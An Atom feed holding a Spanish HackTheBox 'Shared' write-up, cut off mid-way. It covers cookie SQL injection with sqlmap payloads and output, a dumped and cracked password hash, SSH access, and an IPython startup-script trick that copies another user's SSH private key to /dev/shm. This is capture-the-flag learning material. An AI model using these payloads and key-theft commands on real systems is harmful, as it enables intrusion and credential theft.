<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-26T18:18:59-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Shared (medium)</title><link href="http://localhost:4000/hackthebox/machines/hard/2024/05/26/shared.html" rel="alternate" type="text/html" title="HackTheBox - Shared (medium)" /><published>2024-05-26T00:00:00-06:00</published><updated>2024-05-26T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/hard/2024/05/26/shared</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/hard/2024/05/26/shared.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/bf928375e067672d42a572d81684537b.png" />
</p>

<ul>
  <li>Shared is a Medium Difficulty Linux machine that features a Cookie SQL Injection leading to a foothold, which is then used to escalate privileges by reverse engineering a Golang binary and leveraging two CVEs to gain a root shell.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos con el escaneo de puertos y servicios abiertos por el protocolo <strong>TCP</strong> en la maquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,443 10.10.11.172 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-26 12:59 CST
Nmap scan report <span class="k">for </span>10.10.11.172
Host is up <span class="o">(</span>0.092s latency<span class="o">)</span><span class="nb">.</span>

PORT	STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 <span class="o">(</span>RSA<span class="o">)</span>
|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http     nginx 1.18.0
|_http-title: Did not follow redirect to http://shared.htb
|_http-server-header: nginx/1.18.0
443/tcp open  ssl/http nginx 1.18.0
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn:
|   h2
|_  http/1.1
|_http-server-header: nginx/1.18.0
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span><span class="k">*</span>.shared.htb/organizationName<span class="o">=</span>HTB/stateOrProvinceName<span class="o">=</span>None/countryName<span class="o">=</span>US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
|_http-title: Did not follow redirect to https://shared.htb
| tls-nextprotoneg:
|   h2
|_  http/1.1
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Ahora agregamos el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.172 shared.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.172 shared.htb
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/1.png" />
</p>

<ul>
  <li>
    <p>Es una tienda vamos agregar una producto al carrito.</p>
  </li>
  <li>
    <p>Si le damos en procesar el pedido vemos que nos redirige a otro subdominio.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/2.png" />
</p>

<ul>
  <li>
    <p>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
  </li>
  <li>
    <p>Si le damos en <code class="language-plaintext highlighter-rouge">Proceed to checkout</code> nos lleva al subdominio.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/3.png" />
</p>

<h2 id="sql-injection">SQL Injection</h2>

<ul>
  <li>Si ponemos datos cualquiera como input vemos que solo nos dice que el pago se realizo con éxito.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/4.png" />
</p>

<ul>
  <li>Vemos que se están empleando <code class="language-plaintext highlighter-rouge">cookies</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/5.png" />
</p>

<ul>
  <li>Vamos a capturar la petición con <code class="language-plaintext highlighter-rouge">Burpsuite</code> en el momento en el que demos <code class="language-plaintext highlighter-rouge">click</code> ala hora de darle en <code class="language-plaintext highlighter-rouge">proceed to checkout</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/6.png" />
</p>

<ul>
  <li>Si <code class="language-plaintext highlighter-rouge">urldecodiamos</code> la parte de la <code class="language-plaintext highlighter-rouge">cookie</code> vemos los datos que nos muestra a la hora de pagar.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/7.png" />
</p>

<ul>
  <li>Si cambiamos el numero vemos que se refleja.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/8.png" />
</p>

<ul>
  <li>Si aplicamos una inyección <code class="language-plaintext highlighter-rouge">sql</code> para hacer un ordenamiento basándonos en la 3 columna vemos no nos da ningún error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/9.png" />
</p>

<ul>
  <li>
    <p>Ahora bueno si cambiamos de numero nos da error a si que con esto sabemos que hay 3 columnas con esto ya podemos aplicar un <code class="language-plaintext highlighter-rouge">union select</code> para las 3 columnas, lo que debemos hacer es probar en algún campo para ver si se refleja nuestro output para ver el nombre de la base de datos actualmente en uso.</p>
  </li>
  <li>
    <p>Pero como tal no nos deja hasta que cambiemos la parte del <code class="language-plaintext highlighter-rouge">product</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/10.png" />
</p>

<ul>
  <li>También podemos escribir en el campo 3.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/11.png" />
</p>

<ul>
  <li>Ahora podemos listar las bases de datos existentes.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/12.png" />
</p>

<ul>
  <li>Ahora vamos a enumerar las tablas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/13.png" />
</p>

<ul>
  <li>Ahora enumeramos las columnas para la tabla <code class="language-plaintext highlighter-rouge">user</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/14.png" />
</p>

<ul>
  <li>Ahora vemos el contenido de las tablas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/15.png" />
</p>

<ul>
  <li>También lo pudimos haber hecho con <code class="language-plaintext highlighter-rouge">sqlmap</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap sqlmap <span class="nt">-u</span> <span class="s2">"https://checkout.shared.htb/"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'custom_cart={"*":"1"}'</span> <span class="nt">--technique</span> U <span class="nt">--union-cols</span> 3 <span class="nt">--batch</span>
        ___
       __H__
 ___ ___[<span class="o">(]</span>_____ ___ ___  <span class="o">{</span>1.8.3#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[)]</span>     | .<span class="s1">'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program

<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 13:30:00 /2024-05-26/

custom injection marker <span class="o">(</span><span class="s1">'*'</span><span class="o">)</span> found <span class="k">in </span>option <span class="s1">'--headers/--user-agent/--referer/--cookie'</span><span class="nb">.</span> Do you want to process it? <span class="o">[</span>Y/n/q] Y
<span class="o">[</span>13:30:02] <span class="o">[</span>INFO] testing connection to the target URL
<span class="o">[</span>13:30:03] <span class="o">[</span>INFO] checking <span class="k">if </span>the target is protected by some kind of WAF/IPS
<span class="k">do </span>you want to URL encode cookie values <span class="o">(</span>implementation specific<span class="o">)</span>? <span class="o">[</span>Y/n] Y
<span class="o">[</span>13:30:03] <span class="o">[</span>WARNING] heuristic <span class="o">(</span>basic<span class="o">)</span> <span class="nb">test </span>shows that <span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span> might not be injectable
<span class="o">[</span>13:30:04] <span class="o">[</span>INFO] testing <span class="k">for </span>SQL injection on <span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span>
<span class="o">[</span>13:30:04] <span class="o">[</span>INFO] testing <span class="s1">'Generic UNION query (NULL) - 3 to 3 columns (custom)'</span>
<span class="o">[</span>13:30:04] <span class="o">[</span>WARNING] applying generic concatenation <span class="o">(</span>CONCAT<span class="o">)</span>
injection not exploitable with NULL values. Do you want to try with a random integer value <span class="k">for </span>option <span class="s1">'--union-char'</span>? <span class="o">[</span>Y/n] Y
<span class="o">[</span>13:30:11] <span class="o">[</span>WARNING] <span class="k">if </span>UNION based SQL injection is not detected, please consider forcing the back-end DBMS <span class="o">(</span>e.g. <span class="s1">'--dbms=mysql'</span><span class="o">)</span>
Deleting temporary files - please <span class="nb">wait</span> ... <span class="k">done</span><span class="nb">.</span>
<span class="o">[</span>13:30:19] <span class="o">[</span>INFO] <span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span> is <span class="s1">'Generic UNION query (NULL) - 3 to 3 columns (custom)'</span> injectable
<span class="o">[</span>13:30:19] <span class="o">[</span>INFO] checking <span class="k">if </span>the injection point on <span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span> is a <span class="nb">false </span>positive
<span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">[</span>y/N] N
sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 58 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
<span class="nt">---</span>
Parameter: Cookie <span class="c">#1* ((custom) HEADER)</span>
    Type: UNION query
    Title: Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 4 columns <span class="o">(</span>custom<span class="o">)</span>
    Payload: <span class="nv">custom_cart</span><span class="o">={</span><span class="s2">"' UNION ALL SELECT NULL,CONCAT(CONCAT('qzbxq','mDgXayJoyKUymjwMorkqAOaGsoWQfELOhEkSsvUp'),'qvbkq'),NULL-- qbYb"</span>:<span class="s2">"1"</span><span class="o">}</span>
<span class="nt">---</span>
<span class="o">[</span>13:30:20] <span class="o">[</span>INFO] testing MySQL
<span class="o">[</span>13:30:21] <span class="o">[</span>INFO] confirming MySQL
<span class="o">[</span>13:30:22] <span class="o">[</span>INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL <span class="o">&gt;=</span> 5.0.0 <span class="o">(</span>MariaDB fork<span class="o">)</span>
<span class="o">[</span>13:30:22] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/home/miguel/.local/share/sqlmap/output/checkout.shared.htb'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> ending @ 13:30:22 /2024-05-26/
</code></pre></div></div>

<ul>
  <li>Ahora enumeramos las bases de datos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap sqlmap <span class="nt">-u</span> <span class="s2">"https://checkout.shared.htb/"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'custom_cart={"*":"1"}'</span> <span class="nt">--technique</span> U <span class="nt">--union-cols</span> 3 <span class="nt">--batch</span> <span class="nt">--dbs</span>
        ___
       __H__
 ___ ___[<span class="o">(]</span>_____ ___ ___  <span class="o">{</span>1.8.3#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[</span>.]     | .<span class="s1">'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program

<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 13:31:11 /2024-05-26/

custom injection marker <span class="o">(</span><span class="s1">'*'</span><span class="o">)</span> found <span class="k">in </span>option <span class="s1">'--headers/--user-agent/--referer/--cookie'</span><span class="nb">.</span> Do you want to process it? <span class="o">[</span>Y/n/q] Y
<span class="o">[</span>13:31:12] <span class="o">[</span>INFO] resuming back-end DBMS <span class="s1">'mysql'</span>
<span class="o">[</span>13:31:12] <span class="o">[</span>INFO] testing connection to the target URL
sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
<span class="nt">---</span>
Parameter: Cookie <span class="c">#1* ((custom) HEADER)</span>
    Type: UNION query
    Title: Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 4 columns <span class="o">(</span>custom<span class="o">)</span>
    Payload: <span class="nv">custom_cart</span><span class="o">={</span><span class="s2">"' UNION ALL SELECT NULL,CONCAT(CONCAT('qzbxq','mDgXayJoyKUymjwMorkqAOaGsoWQfELOhEkSsvUp'),'qvbkq'),NULL-- qbYb"</span>:<span class="s2">"1"</span><span class="o">}</span>
<span class="nt">---</span>
<span class="o">[</span>13:31:12] <span class="o">[</span>INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 <span class="o">(</span>MariaDB fork<span class="o">)</span>
<span class="o">[</span>13:31:12] <span class="o">[</span>INFO] fetching database names
<span class="k">do </span>you want to URL encode cookie values <span class="o">(</span>implementation specific<span class="o">)</span>? <span class="o">[</span>Y/n] Y
available databases <span class="o">[</span>2]:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> checkout
<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema

<span class="o">[</span>13:31:13] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/home/miguel/.local/share/sqlmap/output/checkout.shared.htb'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> ending @ 13:31:13 /2024-05-26/
</code></pre></div></div>

<ul>
  <li>Ahora las tablas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap sqlmap <span class="nt">-u</span> <span class="s2">"https://checkout.shared.htb/"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'custom_cart={"*":"1"}'</span> <span class="nt">--technique</span> U <span class="nt">--union-cols</span> 3 <span class="nt">--batch</span> <span class="nt">-D</span> checkout <span class="nt">--tables</span>
        ___
       __H__
 ___ ___[,]_____ ___ ___  <span class="o">{</span>1.8.3#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[</span><span class="s2">"]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:31:48 /2024-05-26/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[13:31:48] [INFO] resuming back-end DBMS 'mysql'
[13:31:48] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns (custom)
    Payload: custom_cart={"</span><span class="s1">' UNION ALL SELECT NULL,CONCAT(CONCAT('</span>qzbxq<span class="s1">','</span>mDgXayJoyKUymjwMorkqAOaGsoWQfELOhEkSsvUp<span class="s1">'),'</span>qvbkq<span class="s1">'),NULL-- qbYb":"1"}
---
[13:31:49] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 (MariaDB fork)
[13:31:49] [INFO] fetching tables for database: '</span>checkout<span class="s1">'
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
Database: checkout
[2 tables]
+---------+
| user    |
| product |
+---------+

[13:31:49] [INFO] fetched data logged to text files under '</span>/home/miguel/.local/share/sqlmap/output/checkout.shared.htb<span class="s1">'

[*] ending @ 13:31:49 /2024-05-26/
</span></code></pre></div></div>

<ul>
  <li>Ahora vemos el <code class="language-plaintext highlighter-rouge">hash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap sqlmap <span class="nt">-u</span> <span class="s2">"https://checkout.shared.htb/"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'custom_cart={"*":"1"}'</span> <span class="nt">--technique</span> U <span class="nt">--union-cols</span> 3 <span class="nt">--batch</span> <span class="nt">-D</span> checkout <span class="nt">-T</span> user <span class="nt">--dump</span>
        ___
       __H__
 ___ ___[,]_____ ___ ___  <span class="o">{</span>1.8.3#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[(]</span>     | .<span class="s1">'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program

<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 13:32:24 /2024-05-26/

custom injection marker <span class="o">(</span><span class="s1">'*'</span><span class="o">)</span> found <span class="k">in </span>option <span class="s1">'--headers/--user-agent/--referer/--cookie'</span><span class="nb">.</span> Do you want to process it? <span class="o">[</span>Y/n/q] Y
<span class="o">[</span>13:32:24] <span class="o">[</span>INFO] resuming back-end DBMS <span class="s1">'mysql'</span>
<span class="o">[</span>13:32:24] <span class="o">[</span>INFO] testing connection to the target URL
sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
<span class="nt">---</span>
Parameter: Cookie <span class="c">#1* ((custom) HEADER)</span>
    Type: UNION query
    Title: Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 4 columns <span class="o">(</span>custom<span class="o">)</span>
    Payload: <span class="nv">custom_cart</span><span class="o">={</span><span class="s2">"' UNION ALL SELECT NULL,CONCAT(CONCAT('qzbxq','mDgXayJoyKUymjwMorkqAOaGsoWQfELOhEkSsvUp'),'qvbkq'),NULL-- qbYb"</span>:<span class="s2">"1"</span><span class="o">}</span>
<span class="nt">---</span>
<span class="o">[</span>13:32:25] <span class="o">[</span>INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 <span class="o">(</span>MariaDB fork<span class="o">)</span>
<span class="o">[</span>13:32:25] <span class="o">[</span>INFO] fetching columns <span class="k">for </span>table <span class="s1">'user'</span> <span class="k">in </span>database <span class="s1">'checkout'</span>
<span class="k">do </span>you want to URL encode cookie values <span class="o">(</span>implementation specific<span class="o">)</span>? <span class="o">[</span>Y/n] Y
<span class="o">[</span>13:32:25] <span class="o">[</span>INFO] fetching entries <span class="k">for </span>table <span class="s1">'user'</span> <span class="k">in </span>database <span class="s1">'checkout'</span>
<span class="o">[</span>13:32:25] <span class="o">[</span>INFO] recognized possible password hashes <span class="k">in </span>column <span class="s1">'password'</span>
<span class="k">do </span>you want to store hashes to a temporary file <span class="k">for </span>eventual further processing with other tools <span class="o">[</span>y/N] N
<span class="k">do </span>you want to crack them via a dictionary-based attack? <span class="o">[</span>Y/n/q] Y
<span class="o">[</span>13:32:26] <span class="o">[</span>INFO] using <span class="nb">hash </span>method <span class="s1">'md5_generic_passwd'</span>
what dictionary <span class="k">do </span>you want to use?
<span class="o">[</span>1] default dictionary file <span class="s1">'/usr/share/sqlmap/data/txt/wordlist.tx_'</span> <span class="o">(</span>press Enter<span class="o">)</span>
<span class="o">[</span>2] custom dictionary file
<span class="o">[</span>3] file with list of dictionary files
<span class="o">&gt;</span> 1
<span class="o">[</span>13:32:26] <span class="o">[</span>INFO] using default dictionary
<span class="k">do </span>you want to use common password suffixes? <span class="o">(</span>slow!<span class="o">)</span> <span class="o">[</span>y/N] N
<span class="o">[</span>13:32:26] <span class="o">[</span>INFO] starting dictionary-based cracking <span class="o">(</span>md5_generic_passwd<span class="o">)</span>
<span class="o">[</span>13:32:26] <span class="o">[</span>INFO] starting 2 processes
<span class="o">[</span>13:33:05] <span class="o">[</span>WARNING] no clear password<span class="o">(</span>s<span class="o">)</span> found
Database: checkout
Table: user
<span class="o">[</span>1 entry]
+----+----------------------------------+-------------+
| <span class="nb">id</span> | password                         | username    |
+----+----------------------------------+-------------+
| 1  | fc895d4eddc2fc12f995e18c865cf273 | james_mason |
+----+----------------------------------+-------------+

<span class="o">[</span>13:33:05] <span class="o">[</span>INFO] table <span class="s1">'checkout.`user`'</span> dumped to CSV file <span class="s1">'/home/miguel/.local/share/sqlmap/output/checkout.shared.htb/dump/checkout/user.csv'</span>
<span class="o">[</span>13:33:05] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/home/miguel/.local/share/sqlmap/output/checkout.shared.htb'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> ending @ 13:33:05 /2024-05-26/
</code></pre></div></div>

<ul>
  <li>También podemos hacer un script en <code class="language-plaintext highlighter-rouge">python3</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 exploit.py
james_mason:fc895d4eddc2fc12f995e18c865cf273
Hash guardado en <span class="s1">'hash.txt'</span>
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 512/512 AVX512BW 16x3]<span class="o">)</span>
Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>2
Press Ctrl-C to abort, or send SIGUSR1 to john process <span class="k">for </span>status
Soleil101        <span class="o">(</span>james_mason<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2024-05-26 13:45<span class="o">)</span> 2.000g/s 4182Kp/s 4182Kc/s 4182KC/s Sportster1..Sjoerd
Use the <span class="s2">"--show --format=Raw-MD5"</span> options to display all of the cracked passwords reliably
Session completed.
0 password hashes cracked, 2 left
</code></pre></div></div>

<ul>
  <li>Aquí pueden ver el script <a href="https://github.com/MikeRega7/Scripts/blob/main/HackTheBox/Shared/exploit.py">https://github.com/MikeRega7/Scripts/blob/main/HackTheBox/Shared/exploit.py</a> .</li>
</ul>

<h2 id="shell-as-james_mason">Shell as james_mason</h2>

<ul>
  <li>Ahora nos conectamos por <code class="language-plaintext highlighter-rouge">ssh</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ssh james_mason@10.10.11.172
The authenticity of host <span class="s1">'10.10.11.172 (10.10.11.172)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:UXHSnbXewSQjJVOjGF5RVNToyJZqtdQyS8hgr5P8pWM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.11.172<span class="s1">' (ED25519) to the list of known hosts.
james_mason@10.10.11.172'</span>s password:
Linux shared 5.10.0-16-amd64 <span class="c">#1 SMP Debian 5.10.127-1 (2022-06-30) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:45:22 2022 from 10.10.14.4
james_mason@shared:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<ul>
  <li>Hay otro usuario a nivel de sistema.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total 16
drwxr-xr-x  4 root        root        4096 Jul 14  2022 <span class="nb">.</span>
drwxr-xr-x 18 root        root        4096 Jul 14  2022 ..
drwxr-xr-x  4 dan_smith   dan_smith   4096 Jul 14  2022 dan_smith
drwxr-xr-x  2 james_mason james_mason 4096 Jul 14  2022 james_mason
james_mason@shared:/home<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Estamos en el grupo <code class="language-plaintext highlighter-rouge">developer</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/home<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>james_mason<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>james_mason<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>james_mason<span class="o">)</span>,1001<span class="o">(</span>developer<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Hay una carpeta la cual esta como grupo asignado <code class="language-plaintext highlighter-rouge">developer</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/home<span class="nv">$ </span>find / <span class="nt">-group</span> developer 2&gt;/dev/null
/opt/scripts_review
</code></pre></div></div>

<ul>
  <li>Tenemos capacidad de escritura.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">touch </span>zi
james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 8
drwxrwx--- 2 root        developer   4096 May 26 15:53 <span class="nb">.</span>
drwxr-xr-x 3 root        root        4096 Jul 14  2022 ..
<span class="nt">-rw-r--r--</span> 1 james_mason james_mason    0 May 26 15:53 zi
</code></pre></div></div>

<ul>
  <li>Pero bueno poca cosa vamos a hacer vamos a usar <code class="language-plaintext highlighter-rouge">pspy</code> para ver tareas que se estén ejecutando en el sistema <a href="https://github.com/DominicBreuker/pspy/releases">https://github.com/DominicBreuker/pspy/releases</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/16.png" />
</p>

<ul>
  <li>
    <p>Ahora lo ejecutamos.</p>
  </li>
  <li>
    <p>Esta usando <code class="language-plaintext highlighter-rouge">ipython</code> y se mete ala ruta donde estábamos <a href="https://es.wikipedia.org/wiki/IPython">https://es.wikipedia.org/wiki/IPython</a>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/17.png" />
</p>

<ul>
  <li>
    <p>Si investigamos encontramos como podemos abusar de <code class="language-plaintext highlighter-rouge">ipython</code> <a href="https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x">https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x</a>.</p>
  </li>
  <li>
    <p>Vamos a seguir el <code class="language-plaintext highlighter-rouge">Proof of concept</code> primeros vamos a crearnos un directorio después dentro del directorio <code class="language-plaintext highlighter-rouge">profile_default</code> crea otro directorio con el nombre <code class="language-plaintext highlighter-rouge">startup</code> y después crea un <code class="language-plaintext highlighter-rouge">script</code> con nombre <code class="language-plaintext highlighter-rouge">foo.py</code> y le mete contenido y podemos decirle que como el usuario que queremos convertirnos esta corriendo el proceso pues que cuando se inicie se ejecuta el script y nos de clave <code class="language-plaintext highlighter-rouge">id_rsa</code> y no la ponga en una ruta del sistema para poder conectarnos por <code class="language-plaintext highlighter-rouge">SSH</code> con ese usuario.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-m</span> 777 profile_default <span class="o">&amp;&amp;</span> <span class="nb">mkdir</span> <span class="nt">-m</span> 777 profile_default/startup <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">'import os; os.system("cat ~/.ssh/id_rsa &gt; /dev/shm/key")'</span> <span class="o">&gt;</span> profile_default/startup/foo.py
</code></pre></div></div>

<ul>
  <li>Ahora vamos a esperar que se ejecute la tarea para ver la <code class="language-plaintext highlighter-rouge">id_rsa</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/shm/<span class="p">;</span> <span class="nb">cat </span>key
total 3036
<span class="nt">-rw-r--r--</span> 1 dan_smith   dan_smith      2602 May 26 16:22 key
<span class="nt">-rwxr-xr-x</span> 1 james_mason james_mason 3104768 May 26 15:54 pspy64
